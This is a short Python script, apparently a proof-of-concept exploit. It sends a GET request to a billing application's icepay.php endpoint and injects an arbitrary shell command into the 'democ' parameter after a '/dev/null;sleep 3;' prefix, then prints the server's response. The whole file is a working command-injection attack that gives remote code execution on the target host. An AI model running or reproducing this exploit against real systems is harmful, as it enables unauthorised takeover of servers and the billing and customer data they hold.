import requests 
import sys
import urllib.parse

baseurl  = sys.argv[1]
cmd = sys.argv[2]
encoded_cmd = urllib.parse.quote(cmd)

url = f'http://{baseurl}/mbilling/lib/icepay/icepay.php?democ=/dev/null;sleep%203;{encoded_cmd}'



# Send GET request
response = requests.get(url)

# Print response details
print(f"Status Code: {response.status_code}")
print(f"Headers: {response.headers}")
print("\nResponse Body:\n", response.text[:500])  # 